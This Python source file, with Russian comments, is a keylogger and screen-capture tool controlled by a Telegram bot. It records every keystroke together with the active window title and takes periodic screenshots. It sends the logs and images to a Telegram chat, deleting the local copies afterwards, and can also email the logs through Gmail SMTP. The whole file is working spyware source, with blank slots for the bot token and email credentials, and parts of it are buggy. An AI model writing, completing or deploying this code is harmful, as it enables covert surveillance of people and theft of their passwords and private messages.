import asyncio
import logging
import os
import smtplib  # для отправки электронной почты по протоколу SMTP (gmail)
from datetime import datetime

import keyboard
import pyautogui
from aiogram import Bot, Dispatcher
from aiogram.filters import Command
from aiogram.types import FSInputFile, Message

os.mkdir("logs")
os.mkdir("screenshots")
bot = Bot("")
dp = Dispatcher()
chat_id = ""
SEND_REPORT_EVERY = 10
EMAIL_ADDRESS = ""
EMAIL_PASSWORD = ""

sending_task = None
is_sending = True


async def send_periodic_files(chat_id: int, interval: int):
    global is_sending
    while is_sending:
        log_files = os.listdir("logs")
        photo_files = os.listdir("screenshots")

        for log in log_files:
            log_file = os.path.join("logs", log)
            try:
                await bot.send_document(chat_id=chat_id, document=FSInputFile(log_file))
                os.remove(log_file)  # Удаляем лог-файл после успешной отправки
            except Exception as e:
                await bot.send_message("Ошибка отправки {log_file}: {e}")
                # print(f"Ошибка отправки {log_file}: {e}")

        for photo in photo_files:
            photo_file = os.path.join("screenshots", photo)
            try:
                await bot.send_photo(chat_id=chat_id, photo=FSInputFile(photo_file))
                os.remove(photo_file)
            except Exception as e:
                await bot.send_message("Ошибка отправки {log_file}: {e}")
                # print(f"Ошибка отправки {photo_file}: {e}")

            await asyncio.sleep(1)

        await asyncio.sleep(interval)
        await asyncio.sleep(5)


@dp.message(Command("start"))
async def start_sending_files(msg: Message):
    global sending_task, is_sending
    chat_id = chat_id
    interval = 10  # Интервал в секундах

    if sending_task is None or sending_task.done():
        is_sending = True  # Начинаем отправку
        sending_task = asyncio.create_task(send_periodic_files(chat_id, interval))
        await msg.answer("Отправка файлов началась!")
    else:
        await msg.answer("Отправка файлов уже запущена!")


@dp.message(Command("stop"))
async def stop_sending(msg: Message):
    global sending_task, is_sending
    if sending_task and not sending_task.done():
        is_sending = False  # Останавливаем отправку
        await sending_task  # Ждем, пока задача завершится
        await msg.answer(
            "Отправка файлов остановлена! Теперь скриншоты будут сохраняться."
        )
        keylogger = Keylogger(interval=SEND_REPORT_EVERY)
        asyncio.create_task(keylogger.start())
    else:
        await msg.answer("Отправка файлов не была запущена.")


class Keylogger:
    def __init__(self, interval, report_method="file"):
        # передаем SEND_REPORT_EVERY в интервал
        self.interval = interval
        self.report_method = report_method
        # это строковая переменная, которая содержит лог
        self.log = ""
        # запись начала и окончания даты и времени
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            # не символ, специальная клавиша (например, ctrl, alt и т. д.)
            # верхний регистр
            if name == "space":
                # " " вместо пробелов
                name = " "
            elif name == "enter":
                # добавлять новую строку всякий раз, когда нажимается ENTER
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # замените пробелы символами подчеркивания
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # добавить имя ключа в глобальную переменную
        self.log += name

    def update_filename(self):
        # создать имя файла, которое будет идентифицировано по дате начала и окончания записи
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    async def report_to_file(self):
        # создать файл
        with open(f"logs\{self.filename}.txt", "w", encoding="utf-8") as f:
            # записать лог
            screenshot = pyautogui.screenshot()
            screenshot.save(f"screenshots\screenshot-{self.filename}.png")
            print(
                str(pyautogui.getActiveWindowTitle()).replace(" ", "")
                + " -> "
                + self.log,
                file=f,
            )
        # print(f"[+] Saved {self.filename}.txt")

    async def sendmail(self, email, password, message):
        # управляет подключением к SMTP-серверу
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # подключиться к SMTP-серверу в режиме TLS
        server.starttls()
        # логин
        server.login(email, password)
        # отправить сообщение
        server.sendmail(email, email, message)
        # завершает сеанс
        server.quit()

    async def report(self):
        if self.log:

            self.end_dt = datetime.now()
            # обновить `self.filename`
            self.update_filename()
            if self.report_method == "email":
                await self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                await self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        await asyncio.sleep(self.interval)
        await self.report()

    async def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        await self.report()
        keyboard.wait()


async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    # logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
